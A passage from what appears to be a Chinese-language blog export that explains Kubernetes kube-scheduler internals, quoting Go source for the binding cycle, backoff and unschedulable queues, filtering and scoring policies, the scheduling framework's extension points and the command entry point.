metrics.SchedulerGoroutines.WithLabelValues(metrics.Binding).Dec() // 运行WaitOnPermit插件，如果失败则，unReserve回滚 waitOnPermitStatus := fwk.WaitOnPermit(bindingCycleCtx, assumedPod) if !waitOnPermitStatus.IsSuccess() { var reason string if waitOnPermitStatus.IsUnschedulable() { metrics.PodUnschedulable(fwk.ProfileName(), metrics.SinceInSeconds(start)) reason = v1.PodReasonUnschedulable } else { metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) reason = SchedulerError } // trigger un-reserve plugins to clean up state associated with the reserved Pod fwk.RunReservePluginsUnreserve(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) if forgetErr := sched.Cache.ForgetPod(assumedPod); forgetErr != nil { klog.ErrorS(forgetErr, \u0026quot;scheduler cache ForgetPod failed\u0026quot;) } else { // \u0026quot;Forget\u0026quot;ing an assumed Pod in binding cycle should be treated as a PodDelete event, // as the assumed Pod had occupied a certain amount of resources in scheduler cache. // TODO(#103853): de-duplicate the logic. // Avoid moving the assumed Pod itself as it's always Unschedulable. // It's intentional to \u0026quot;defer\u0026quot; this operation; otherwise MoveAllToActiveOrBackoffQueue() would // update `q.moveRequest` and thus move the assumed pod to backoffQ anyways. defer sched.SchedulingQueue.MoveAllToActiveOrBackoffQueue(internalqueue.AssignedPodDelete, func(pod *v1.Pod) bool { return assumedPod.UID != pod.UID }) } sched.handleSchedulingFailure(ctx, fwk, assumedPodInfo, waitOnPermitStatus.AsError(), reason, clearNominatedNode) return } // 运行Prebind 插件 preBindStatus := fwk.RunPreBindPlugins(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) if !preBindStatus.IsSuccess() { metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) // trigger un-reserve plugins to clean up state associated with the reserved Pod fwk.RunReservePluginsUnreserve(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) if forgetErr := sched.Cache.ForgetPod(assumedPod); forgetErr != nil { klog.ErrorS(forgetErr, \u0026quot;scheduler cache ForgetPod failed\u0026quot;) } else { // \u0026quot;Forget\u0026quot;ing an assumed Pod in binding cycle should be treated as a PodDelete event, // as the assumed Pod had occupied a certain amount of resources in scheduler cache. // TODO(#103853): de-duplicate the logic. sched.SchedulingQueue.MoveAllToActiveOrBackoffQueue(internalqueue.AssignedPodDelete, nil) } sched.handleSchedulingFailure(ctx, fwk, assumedPodInfo, preBindStatus.AsError(), SchedulerError, clearNominatedNode) return } // bind是真正的绑定操作 err := sched.bind(bindingCycleCtx, fwk, assumedPod, scheduleResult.SuggestedHost, state) if err != nil { metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) // 如果失败了就触发 un-reserve plugins fwk.RunReservePluginsUnreserve(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) if err := sched.Cache.ForgetPod(assumedPod); err != nil { klog.ErrorS(err, \u0026quot;scheduler cache ForgetPod failed\u0026quot;) } else { // \u0026quot;Forget\u0026quot;ing an assumed Pod in binding cycle should be treated as a PodDelete event, // as the assumed Pod had occupied a certain amount of resources in scheduler cache. // TODO(#103853): de-duplicate the logic. sched.SchedulingQueue.MoveAllToActiveOrBackoffQueue(internalqueue.AssignedPodDelete, nil) } sched.handleSchedulingFailure(ctx, fwk, assumedPodInfo, fmt.Errorf(\u0026quot;binding rejected: %w\u0026quot;, err), SchedulerError, clearNominatedNode) return } // Calculating nodeResourceString can be heavy. Avoid it if klog verbosity is below 2. klog.V(2).InfoS(\u0026quot;Successfully bound pod to node\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;node\u0026quot;, scheduleResult.SuggestedHost, \u0026quot;evaluatedNodes\u0026quot;, scheduleResult.EvaluatedNodes, \u0026quot;feasibleNodes\u0026quot;, scheduleResult.FeasibleNodes) metrics.PodScheduled(fwk.ProfileName(), metrics.SinceInSeconds(start)) metrics.PodSchedulingAttempts.Observe(float64(podInfo.Attempts)) metrics.PodSchedulingDuration.WithLabelValues(getAttemptsLabel(podInfo)).Observe(metrics.SinceInSeconds(podInfo.InitialAttemptTimestamp)) // 运行 \u0026quot;postbind\u0026quot; 插件 // 是通知性的扩展点，该插件在绑定 Pod 后调用，可用于清理相关资源（）。 fwk.RunPostBindPlugins(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) // At the end of a successful binding cycle, move up Pods if needed. if len(podsToActivate.Map) != 0 { sched.SchedulingQueue.Activate(podsToActivate.Map) // Unlike the logic in scheduling cycle, we don't bother deleting the entries // as `podsToActivate.Map` is no longer consumed. } }() } 调度上下文中的失败流程 上面说到的都是正常的请求，下面会对失败的请求是如何重试的进行分析，而 scheduler 中关于失败处理方面相关的属性会涉及到上面 scheduler 结构中的 backoffQ 与 unschedulablePods backoffQ：也是一个 heap 类型的优先级队列，存放的是不可调度的Pod unschedulablePods ：保存确定不可被调度的Pod，一个map类型 backoffQ 与 unschedulablePods 会在初始化 scheduler 时初始化，\nfunc NewPriorityQueue( lessFn framework.LessFunc, informerFactory informers.SharedInformerFactory, opts ...Option, ) *PriorityQueue { options := defaultPriorityQueueOptions for _, opt := range opts { opt(\u0026amp;options) } comp := func(podInfo1, podInfo2 interface{}) bool { pInfo1 := podInfo1.(*framework.QueuedPodInfo) pInfo2 := podInfo2.(*framework.QueuedPodInfo) return lessFn(pInfo1, pInfo2) } if options.podNominator == nil { options.podNominator = NewPodNominator(informerFactory.Core().V1().Pods().Lister()) } pq := \u0026amp;PriorityQueue{ PodNominator: options.podNominator, clock: options.clock, stop: make(chan struct{}), podInitialBackoffDuration: options.podInitialBackoffDuration, podMaxBackoffDuration: options.podMaxBackoffDuration, podMaxInUnschedulablePodsDuration: options.podMaxInUnschedulablePodsDuration, activeQ: heap.NewWithRecorder(podInfoKeyFunc, comp, metrics.NewActivePodsRecorder()), unschedulablePods: newUnschedulablePods(metrics.NewUnschedulablePodsRecorder()), moveRequestCycle: -1, clusterEventMap: options.clusterEventMap, } pq.cond.L = \u0026amp;pq.lock // 初始化backoffQ // NewWithRecorder作为一个可选的 metricRecorder 的 Heap 对象。 // podInfoKeyFunc是一个函数，返回错误与字符串 // pq.podsCompareBackoffCompleted 比较两个pod的回退时间，如果第一个在第二个之前为true， // 反之 false pq.podBackoffQ = heap.NewWithRecorder(podInfoKeyFunc, pq.podsCompareBackoffCompleted, metrics.NewBackoffPodsRecorder()) pq.nsLister = informerFactory.Core().V1().Namespaces().Lister() return pq } 对于初始化 backoffQ 会产生的两个函数，getBackoffTime 与 calculateBackoffDuration\n// getBackoffTime returns the time that podInfo completes backoff func (p *PriorityQueue) getBackoffTime(podInfo *framework.QueuedPodInfo) time.Time { duration := p.calculateBackoffDuration(podInfo) backoffTime := podInfo.Timestamp.Add(duration) return backoffTime } // calculateBackoffDuration is a helper function for calculating the backoffDuration // based on the number of attempts the pod has made. func (p *PriorityQueue) calculateBackoffDuration(podInfo *framework.QueuedPodInfo) time.Duration { duration := p.podInitialBackoffDuration for i := 1; i \u0026lt; podInfo.Attempts; i++ { // Use subtraction instead of addition or multiplication to avoid overflow. if duration \u0026gt; p.podMaxBackoffDuration-duration { return p.podMaxBackoffDuration } duration += duration } return duration } 对于整个故障错误会按照如下流程进行，在初始化 scheduler 会注册一个 Error 函数，这个函数用作对不可调度Pod进行处理，实际上被注册的函数是 MakeDefaultErrorFunc。这个函数将作为 Error 函数被调用。\nsched := newScheduler( schedulerCache, extenders, internalqueue.MakeNextPodFunc(podQueue), MakeDefaultErrorFunc(client, podLister, podQueue, schedulerCache), stopEverything, podQueue, profiles, client, snapshot, options.percentageOfNodesToScore, ) 而在 调度周期中，也就是 scheduleOne 可以看到，每个扩展点操作失败后都会调用 handleSchedulingFailure 而该函数，使用了注册的 Error 函数来处理Pod\nfunc (sched *Scheduler) scheduleOne(ctx context.Context) { ... defer cancel() scheduleResult, err := sched.SchedulePod(schedulingCycleCtx, fwk, state, pod) if err != nil { var nominatingInfo *framework.NominatingInfo if fitError, ok := err.(*framework.FitError); ok { if !fwk.HasPostFilterPlugins() { klog.V(3).InfoS(\u0026quot;No PostFilter plugins are registered, so no preemption will be performed\u0026quot;) } else { result, status := fwk.RunPostFilterPlugins(ctx, state, pod, fitError.Diagnosis.NodeToStatusMap) if status.Code() == framework.Error { klog.ErrorS(nil, \u0026quot;Status after running PostFilter plugins for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;status\u0026quot;, status) } else { fitError.Diagnosis.PostFilterMsg = status.Message() klog.V(5).InfoS(\u0026quot;Status after running PostFilter plugins for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;status\u0026quot;, status) } if result != nil { nominatingInfo = result.NominatingInfo } } metrics.PodUnschedulable(fwk.ProfileName(), metrics.SinceInSeconds(start)) } else if err == ErrNoNodesAvailable { nominatingInfo = clearNominatedNode // No nodes available is counted as unschedulable rather than an error. metrics.PodUnschedulable(fwk.ProfileName(), metrics.SinceInSeconds(start)) } else { nominatingInfo = clearNominatedNode klog.ErrorS(err, \u0026quot;Error selecting node for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) } // 处理不可调度Pod sched.handleSchedulingFailure(ctx, fwk, podInfo, err, v1.PodReasonUnschedulable, nominatingInfo) return } 来到了注册的 Error 函数 MakeDefaultErrorFunc\nfunc MakeDefaultErrorFunc(client clientset.Interface, podLister corelisters.PodLister, podQueue internalqueue.SchedulingQueue, schedulerCache internalcache.Cache) func(*framework.QueuedPodInfo, error) { return func(podInfo *framework.QueuedPodInfo, err error) { pod := podInfo.Pod if err == ErrNoNodesAvailable { klog.V(2).InfoS(\u0026quot;Unable to schedule pod; no nodes are registered to the cluster; waiting\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) } else if fitError, ok := err.(*framework.FitError); ok { // Inject UnschedulablePlugins to PodInfo, which will be used later for moving Pods between queues efficiently. podInfo.UnschedulablePlugins = fitError.Diagnosis.UnschedulablePlugins klog.V(2).InfoS(\u0026quot;Unable to schedule pod; no fit; waiting\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;err\u0026quot;, err) } else if apierrors.IsNotFound(err) { klog.V(2).InfoS(\u0026quot;Unable to schedule pod, possibly due to node not found; waiting\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;err\u0026quot;, err) if errStatus, ok := err.(apierrors.APIStatus); ok \u0026amp;\u0026amp; errStatus.Status().Details.Kind == \u0026quot;node\u0026quot; { nodeName := errStatus.Status().Details.Name // when node is not found, We do not remove the node right away. Trying again to get // the node and if the node is still not found, then remove it from the scheduler cache. _, err := client.CoreV1().Nodes().Get(context.TODO(), nodeName, metav1.GetOptions{}) if err != nil \u0026amp;\u0026amp; apierrors.IsNotFound(err) { node := v1.Node{ObjectMeta: metav1.ObjectMeta{Name: nodeName}} if err := schedulerCache.RemoveNode(\u0026amp;node); err != nil { klog.V(4).InfoS(\u0026quot;Node is not found; failed to remove it from the cache\u0026quot;, \u0026quot;node\u0026quot;, node.Name) } } } } else { klog.ErrorS(err, \u0026quot;Error scheduling pod; retrying\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) } // Check if the Pod exists in informer cache. cachedPod, err := podLister.Pods(pod.Namespace).Get(pod.Name) if err != nil { klog.InfoS(\u0026quot;Pod doesn't exist in informer cache\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;err\u0026quot;, err) return } // In the case of extender, the pod may have been bound successfully, but timed out returning its response to the scheduler. // It could result in the live version to carry .spec.nodeName, and that's inconsistent with the internal-queued version. if len(cachedPod.Spec.NodeName) != 0 { klog.InfoS(\u0026quot;Pod has been assigned to node. Abort adding it back to queue.\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;node\u0026quot;, cachedPod.Spec.NodeName) return } // As \u0026lt;cachedPod\u0026gt; is from SharedInformer, we need to do a DeepCopy() here. podInfo.PodInfo = framework.NewPodInfo(cachedPod.DeepCopy()) // 添加到unschedulable队列中 if err := podQueue.AddUnschedulableIfNotPresent(podInfo, podQueue.SchedulingCycle()); err != nil { klog.ErrorS(err, \u0026quot;Error occurred\u0026quot;) } } } 下面来到 AddUnschedulableIfNotPresent ，这个也是操作 backoffQ 和 unschedulablePods 的真正的动作\nAddUnschedulableIfNotPresent 函数会吧无法调度的 pod 插入队列，除非它已经在队列中。通常情况下，PriorityQueue 将不可调度的 Pod 放在 unschedulablePods 中。但如果最近有 move request，则将 pod 放入 podBackoffQ 中。\nfunc (p *PriorityQueue) AddUnschedulableIfNotPresent(pInfo *framework.QueuedPodInfo, podSchedulingCycle int64) error { p.lock.Lock() defer p.lock.Unlock() pod := pInfo.Pod // 如果已经存在则不添加 if p.unschedulablePods.get(pod) != nil { return fmt.Errorf(\u0026quot;Pod %v is already present in unschedulable queue\u0026quot;, klog.KObj(pod)) } // 检查是否在activeQ中 if _, exists, _ := p.activeQ.Get(pInfo); exists { return fmt.Errorf(\u0026quot;Pod %v is already present in the active queue\u0026quot;, klog.KObj(pod)) } // 检查是否在podBackoffQ中 if _, exists, _ := p.podBackoffQ.Get(pInfo); exists { return fmt.Errorf(\u0026quot;Pod %v is already present in the backoff queue\u0026quot;, klog.KObj(pod)) } // 在重新添加时，会刷新 Pod时间为最新操作的时间 pInfo.Timestamp = p.clock.Now() for plugin := range pInfo.UnschedulablePlugins { metrics.UnschedulableReason(plugin, pInfo.Pod.Spec.SchedulerName).Inc() } // 如果接受到move request那么则放入BackoffQ if p.moveRequestCycle \u0026gt;= podSchedulingCycle { if err := p.podBackoffQ.Add(pInfo); err != nil { return fmt.Errorf(\u0026quot;error adding pod %v to the backoff queue: %v\u0026quot;, pod.Name, err) } metrics.SchedulerQueueIncomingPods.WithLabelValues(\u0026quot;backoff\u0026quot;, ScheduleAttemptFailure).Inc() } else { // 否则将放入到 unschedulablePods p.unschedulablePods.addOrUpdate(pInfo) metrics.SchedulerQueueIncomingPods.WithLabelValues(\u0026quot;unschedulable\u0026quot;, ScheduleAttemptFailure).Inc() } p.PodNominator.AddNominatedPod(pInfo.PodInfo, nil) return nil } 在启动 scheduler 时，会将这两个队列异步启用两个loop来操作队列。表现在 Run()\nfunc (p *PriorityQueue) Run() { go wait.Until(p.flushBackoffQCompleted, 1.0*time.Second, p.stop) go wait.Until(p.flushUnschedulablePodsLeftover, 30*time.Second, p.stop) } 可以看到 flushBackoffQCompleted 作为 BackoffQ 实现；而 flushUnschedulablePodsLeftover 作为 UnschedulablePods 实现。\nflushBackoffQCompleted 是用于将所有已完成回退的 pod 从 backoffQ 移到 activeQ 中\nfunc (p *PriorityQueue) flushBackoffQCompleted() { p.lock.Lock() defer p.lock.Unlock() broadcast := false for { // 这就是heap实现的方法，窥视下，但不弹出 rawPodInfo := p.podBackoffQ.Peek() if rawPodInfo == nil { break } pod := rawPodInfo.(*framework.QueuedPodInfo).Pod boTime := p.getBackoffTime(rawPodInfo.(*framework.QueuedPodInfo)) if boTime.After(p.clock.Now()) { break } _, err := p.podBackoffQ.Pop() // 弹出一个 if err != nil { klog.ErrorS(err, \u0026quot;Unable to pop pod from backoff queue despite backoff completion\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) break } p.activeQ.Add(rawPodInfo) // 放入到活动队列中 metrics.SchedulerQueueIncomingPods.WithLabelValues(\u0026quot;active\u0026quot;, BackoffComplete).Inc() broadcast = true } if broadcast { p.cond.Broadcast() } } flushUnschedulablePodsLeftover 函数用于将在 unschedulablePods 中的存放时间超过 podMaxInUnschedulablePodsDuration 值的 pod 移动到 backoffQ 或 activeQ 中。\npodMaxInUnschedulablePodsDuration 会根据配置传入，当没有传入，也就是使用了 Deprecated 那么会为5分钟。\nfunc NewOptions() *Options { o := \u0026amp;Options{ SecureServing: apiserveroptions.NewSecureServingOptions().WithLoopback(), Authentication: apiserveroptions.NewDelegatingAuthenticationOptions(), Authorization: apiserveroptions.NewDelegatingAuthorizationOptions(), Deprecated: \u0026amp;DeprecatedOptions{ PodMaxInUnschedulablePodsDuration: 5 * time.Minute, }, 对于 flushUnschedulablePodsLeftover 就是做一个时间对比，然后添加到对应的队列中\nfunc (p *PriorityQueue) flushUnschedulablePodsLeftover() { p.lock.Lock() defer p.lock.Unlock() var podsToMove []*framework.QueuedPodInfo currentTime := p.clock.Now() for _, pInfo := range p.unschedulablePods.podInfoMap { lastScheduleTime := pInfo.Timestamp if currentTime.Sub(lastScheduleTime) \u0026gt; p.podMaxInUnschedulablePodsDuration { podsToMove = append(podsToMove, pInfo) } } if len(podsToMove) \u0026gt; 0 { p.movePodsToActiveOrBackoffQueue(podsToMove, UnschedulableTimeout) } } 总结调度上下文流程 在构建一个 scheduler 时经历如下步骤： 准备cache，informer，queue，错误处理函数等 添加事件函数，会监听资源（如Pod），当有变动则触发对应事件函数，这是入站 activeQ 构建完成后会 run，run时会run一个 SchedulingQueue，这个是作为不可调度队列 BackoffQ UnschedulablePods 不可调度队列会根据注册时定期消费队列中Pod将其添加到 activeQ 中 启动一个 scheduleOne 的loop，这个是调度上下文中所有的扩展点的执行，也是 activeQ 的消费端 scheduleOne 获取 pod 执行各个扩展点，如果出错则 Error 函数 MakeDefaultErrorFunc 将其添加到不可调度队列中 回到不可调度队列中消费部分 Reference [1] kubernetes scheduler extender\n","permalink":"https://www.oomkill.com/2022/07/ch20-schedule-workflow/","summary":"","title":"kube-scheduler的调度上下文"},{"content":"Overview [1] kubernetes集群中的调度程序 kube-scheduler 会 watch 未分配节点的新创建的Pod，并未该Pod找到可运行的最佳（特定）节点。那么这些动作或者说这些原理是怎么实现的呢，让我们往下剖析下。\n对于新创建的 pod 或其他未调度的 pod来讲，kube-scheduler 选择一个最佳节点供它们运行。但是，Pod 中的每个容器对资源的要求都不同，每个 Pod 也有不同的要求。因此，需要根据具体的调度要求对现有节点进行过滤。\n在Kubernetes集群中，满足 Pod 调度要求的节点称为可行节点 （ feasible nodes FN） 。如果没有合适的节点，则 pod 将保持未调度状态，直到调度程序能够放置它。也就是说，当我们创建Pod时，如果长期处于 Pending 状态，这个时候应该看你的集群调度器是否因为某些问题没有合适的节点了\n调度器为 Pod 找到 FN 后，然后运行一组函数对 FN 进行评分，并在 FN 中找到得分最高的节点来运行 Pod。\n调度策略在决策时需要考虑的因素包括个人和集体资源需求、硬件/软件/策略约束 （constraints）、亲和性 (affinity) 和反亲和性（ anti-affinity ）规范、数据局部性、工作负载间干扰等。\n如何为pod选择节点？ kube-scheduler 为pod选择节点会分位两部：\n过滤 (Filtering) 打分 (Scoring) 过滤也被称为预选 （Predicates），该步骤会找到可调度的节点集，然后通过是否满足特定资源的请求，例如通过 PodFitsResources 过滤器检查候选节点是否有足够的资源来满足 Pod 资源的请求。这个步骤完成后会得到一个包含合适的节点的列表（通常为多个），如果列表为空，则Pod不可调度。\n打分也被称为优选（Priorities），在该步骤中，会对上一个步骤的输出进行打分，Scheduer 通过打分的规则为每个通过 Filtering 步骤的节点计算出一个分数。\n完成上述两个步骤之后，kube-scheduler 会将Pod分配给分数最高的 Node，如果存在多个相同分数的节点，会随机选择一个。\nkubernetes的调度策略 Kubernetes 1.21之前版本可以在代码 kubernetes\\pkg\\scheduler\\algorithmprovider\\registry.go 中看到对应的注册模式，在1.22 scheduler 更换了其路径，对于registry文件更换到了kubernetes\\pkg\\scheduler\\framework\\plugins\\registry.go ；对于kubernetes官方说法为，调度策略是用于“预选” (Predicates )或 过滤（filtering ） 和 用于 优选（Priorities）或 评分 (scoring)的\n注：kubernetes官方没有找到预选和优选的概念，而Predicates和filtering 是处于预选阶段的动词，而Priorities和scoring是优选阶段的动词。后面用PF和PS代替这个两个词。\n为Pod预选节点 [2] 上面也提到了，filtering 的目的是为了排除（过滤）掉不满足 Pod 要求的节点。例如，某个节点上的闲置资源小于 Pod 所需资源，则该节点不会被考虑在内，即被过滤掉。在 “Predicates” 阶段实现的 filtering 策略，包括：\nNoDiskConflict ：评估是否有合适Pod请求的卷 NoVolumeZoneConflict：在给定zone限制情况下，评估Pod请求所需的卷在Node上是否可用 PodFitsResources：检查空闲资源（CPU、内存）是否满足Pod请求 PodFitsHostPorts：检查Pod所需端口在Node上是否被占用 HostName： 过滤除去，PodSpec 中 NodeName 字段中指定的Node之外的所有Node。 MatchNodeSelector：检查Node的 label 是否与 Pod 配置中 nodeSelector字段中指定的 label 匹配，并且从 Kubernetes v1.2 开始， 如果存在 nodeAffinity 也会匹配。 CheckNodeMemoryPressure：检查是否可以在已出现内存压力情况节点上调度 Pod。 CheckNodeDiskPressure：检查是否可以在报告磁盘压力情况的节点上调度 Pod 具体对应得策略可以在 kubernetes\\pkg\\scheduler\\framework\\plugins\\registry.go 看到\n对预选节点打分 [2] 通过上面步骤过滤过得列表则是适合托管的Pod，这个结果通常来说是一个列表，如何选择最优Node进行调度，则是接下来打分的步骤步骤。\n例如：Kubernetes对剩余节点进行优先级排序，优先级由一组函数计算；优先级函数将为剩余节点给出从0~10 的分数，10 表示最优，0 表示最差。每个优先级函数由一个正数加权组成，每个Node的得分是通过将所有加权得分相加来计算的。设有两个优先级函数，priorityFunc1 和 priorityFunc2 加上权重因子 weight1 和weight2，那么这个Node的最终得分为：$finalScore = (w1 \\times priorityFunc1) + (w2 \\times priorityFunc2)$。计算完分数后，选择最高分数的Node做为Pod的宿主机，存在多个相同分数Node情况下会随机选择一个Node。\n目前kubernetes提供了一些在打分 Scoring 阶段算法：\nLeastRequestedPriority：Node的优先级基于Node的空闲部分$\\frac{capacity\\ -\\ Node上所有存在的Pod\\ -\\ 正在调度的Pod请求}{capacity}$，通过计算具有最高分数的Node是FN BalancedResourceAllocation ：该算法会将 Pod 放在一个Node上，使得在Pod 部署后 CPU 和内存的使用率为平衡的 SelectorSpreadPriority：通过最小化资源方式，将属于同一种服务、控制器或同一Node上的Replica的 Pod的数量来分布Pod。如果节点上存在Zone，则会调整优先级，以便 pod可以分布在Zone之上。 CalculateAntiAffinityPriority：根据label来分布，按照相同service上相同label值的pod进行分配 ImageLocalityPriority ：根据Node上镜像进行打分，Node上存在Pod请求所需的镜像优先级较高。 在代码中查看上述的代码 以 PodFitsHostPorts 算法为例，因为是Node类算法，在kubernetes\\pkg\\scheduler\\framework\\plugins\\nodeports\n调度框架 [3] 调度框架 (scheduling framework SF ) 是kubernetes为 scheduler设计的一个pluggable的架构。SF 将scheduler设计为 Plugin 式的 API，API将上一章中提到的一些列调度策略实现为 Plugin。\n在 SF 中，定义了一些扩展点 （extension points EP ），而被实现为Plugin的调度程序将被注册在一个或多个 EP 中，换句话来说，在这些 EP 的执行过程中如果注册在多个 EP 中，将会在多个 EP 被调用。\n每次调度都分为两个阶段，调度周期（Scheduling Cycel）与绑定周期（Binding Cycle）。\nSC 表示为，为Pod选择一个节点；SC 是串行运行的。 BC 表示为，将 SC 决策结果应用于集群中；BC 可以同时运行。 调度周期与绑定周期结合一起，被称为调度上下文 （Scheduling Context）,下图则是调度上下文的工作流\n注：如果决策结果为Pod的调度结果无可用节点，或存在内部错误，则中止 SC 或 BC。Pod将重入队列重试\n图1：Pod的调度上下文 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/scheduling-framework 扩展点 [4] 扩展点（Extension points）是指在调度上下文中的每个可扩展API，通过图提现为[图1]。其中 Filter 相当于 Predicate 而 Scoring 相当于 Priority。\n对于调度阶段会通过以下扩展点：\nSort：该插件提供了排序功能，用于对在调度队列中待处理 Pod 进行排序。一次只能启用一个队列排序。\npreFilter：该插件用于在过滤之前预处理或检查 Pod 或集群的相关信息。这里会终止调度\nfilter：该插件相当于调度上下文中的 Predicates，用于排除不能运行 Pod 的节点。Filter 会按配置的顺序进行调用。如果有一个filter将节点标记位不可用，则将 Pod 标记为不可调度（即不会向下执行）。\npostFilter：当没有为 pod 找到FN时，该插件会按照配置的顺序进行调用。如果任何postFilter插件将 Pod 标记为schedulable，则不会调用其余插件。即 filter 成功后不会进行这步骤\npreScore：可用于进行预Score工作（通知性的扩展点）。\nscore：该插件为每个通过 filter 阶段的Node提供打分服务。然后Scheduler将选择具有最高加权分数总和的Node。\nreserve：因为绑定事件时异步发生的，该插件是为了避免Pod在绑定到节点前时，调度到新的Pod，使节点使用资源超过可用资源情况。如果后续阶段发生错误或失败，将触发 UnReserve 回滚（通知性扩展点）。这也是作为调度周期中最后一个状态，要么成功到 postBind ，要么失败触发 UnReserve。\npermit：该插件可以阻止或延迟 Pod 的绑定，一般情况下这步骤会做三件事：\nappove ：调度器继续绑定过程 Deny：如果任何一个Premit拒绝了Pod与节点的绑定，那么将触发 UnReserve ，并重入队列 Wait： 如果 Permit 插件返回 Wait，该 Pod 将保留在内部 Wait Pod 列表中，直到被 Appove。如果发生超时，wait 变为 deny ，将Pod放回至调度队列中，并触发 Unreserve 回滚 。 preBind：该插件用于在 bind Pod 之前执行所需的前置工作。如，preBind 可能会提供一个网络卷并将其挂载到目标节点上。如果在该步骤中的任意插件返回错误，则Pod 将被 deny 并放置到调度队列中。\nbind：在所有的 preBind 完成后，该插件将用于将Pod绑定到Node，并按顺序调用绑定该步骤的插件。如果有一个插件处理了这个事件，那么则忽略其余所有插件。\npostBind：该插件在绑定 Pod 后调用，可用于清理相关资源（通知性的扩展点）。\nmultiPoint：这是一个仅配置字段，允许同时为所有适用的扩展点启用或禁用插件。\nkube-scheduler工作流分析 对于 kube-scheduler 组件的分析，包含 kube-scheduler 启动流程，以及scheduler调度流程。这里会主要针对启动流程分析，后面算法及二次开发部分会切入调度分析。\n对于我们部署时使用的 kube-scheduler 位于 cmd/kube-scheduler ，在 Alpha (1.16) 版本提供了调度框架的模式，到 Stable (1.19) ，从代码结构上是相似的；直到1.22后改变了代码风格。\n首先看到的是 kube-scheduler 的入口 cmd/kube-scheduler ，这里主要作为两部分，构建参数与启动server ,这里严格来讲 kube-scheduer 是作为一个server，而调度框架等部分是另外的。\nfunc main() { command := app.NewSchedulerCommand() code := cli.Run(command) os.Exit(code) } cli.Run 提供了cobra构成的命令行cli，日志将输出为标准输出\n// 这里是main中执行的Run func Run(cmd *cobra.Command) int { if logsInitialized, err := run(cmd); err != nil { if !logsInitialized { fmt.Fprintf(os.Stderr, \u0026quot;Error: %v\\n\u0026quot;, err) } else { klog.ErrorS(err, \u0026quot;command failed\u0026quot;) } return 1 } return 0 } // 这个run作为 func run(cmd *cobra.Command) (logsInitialized bool, err error) { rand.Seed(time.Now().UnixNano()) defer logs.FlushLogs() cmd.SetGlobalNormalizationFunc(cliflag.WordSepNormalizeFunc) if !cmd.SilenceUsage { cmd.SilenceUsage = true cmd.SetFlagErrorFunc(func(c *cobra.Command, err error) error { // Re-enable usage printing. c.SilenceUsage = false return err }) } // In all cases error printing is done below. cmd.SilenceErrors = true // This is idempotent. logs.AddFlags(cmd.PersistentFlags()) // Inject logs.InitLogs after command line parsing into one of the // PersistentPre* functions. switch { case cmd.PersistentPreRun != nil: pre := cmd.PersistentPreRun cmd.PersistentPreRun = func(cmd *cobra.Command, args []string) { logs.InitLogs() logsInitialized = true pre(cmd, args) } case cmd.PersistentPreRunE != nil: pre := cmd.PersistentPreRunE cmd.PersistentPreRunE = func(cmd *cobra.Command, args []string) error { logs.InitLogs() logsInitialized = true return pre(cmd, args) } default: cmd.PersistentPreRun = func(cmd *cobra.Command, args []string) { logs.InitLogs() logsInitialized = true } } err = cmd.Execute() return } 可以看到最终是调用 command.Execute() 执行，这个是执行本身构建的命令，而真正被执行的则是上面的 app.NewSchedulerCommand() ,那么来看看这个是什么\napp.NewSchedulerCommand() 构建了一个cobra.Commond对象， runCommand() 被封装在内，这个是作为启动scheduler的函数\nfunc NewSchedulerCommand(registryOptions ...Option) *cobra.Command { opts := options.NewOptions() cmd := \u0026amp;cobra.Command{ Use: \u0026quot;kube-scheduler\u0026quot;, Long: `The Kubernetes scheduler is a control plane process which assigns Pods to Nodes. The scheduler determines which Nodes are valid placements for each Pod in the scheduling queue according to constraints and available resources. The scheduler then ranks each valid Node and binds the Pod to a suitable Node. Multiple different schedulers may be used within a cluster; kube-scheduler is the reference implementation. See [scheduling](https://kubernetes.io/docs/concepts/scheduling-eviction/) for more information about scheduling and the kube-scheduler component.`, RunE: func(cmd *cobra.Command, args []string) error { return runCommand(cmd, opts, registryOptions...) }, Args: func(cmd *cobra.Command, args []string) error { for _, arg := range args { if len(arg) \u0026gt; 0 { return fmt.Errorf(\u0026quot;%q does not take any arguments, got %q\u0026quot;, cmd.CommandPath(), args) } } return nil }, } nfs := opts.Flags verflag.AddFlags(nfs.FlagSet(\u0026quot;global\u0026quot;)) globalflag.AddGlobalFlags(nfs.FlagSet(\u0026quot;global\u0026quot;), cmd.Name(), logs.SkipLoggingConfigurationFlags()) fs := cmd.Flags() for _, f := range nfs.FlagSets { fs.AddFlagSet(f) } cols, _, _ := term.TerminalSize(cmd.OutOrStdout()) cliflag.SetUsageAndHelpFunc(cmd, *nfs, cols) if err := cmd.MarkFlagFilename(\u0026quot;config\u0026quot;, \u0026quot;yaml\u0026quot;, \u0026quot;yml\u0026quot;, \u0026quot;json\u0026quot;); err != nil { klog.ErrorS(err, \u0026quot;Failed to mark flag filename\u0026quot;) } return cmd } 下面来看下 runCommand() 在启动 scheduler 时提供了什么功能。\n在新版中已经没有 algorithmprovider 的概念，所以在 runCommand 中做的也就是仅仅启动这个 scheduler ，而 scheduler 作为kubernetes组件，也是会watch等操作，自然少不了informer。其次作为和 controller-manager 相同的工作特性，kube-scheduler 也是 基于Leader选举的。\nfunc Run(ctx context.Context, cc *schedulerserverconfig.CompletedConfig, sched 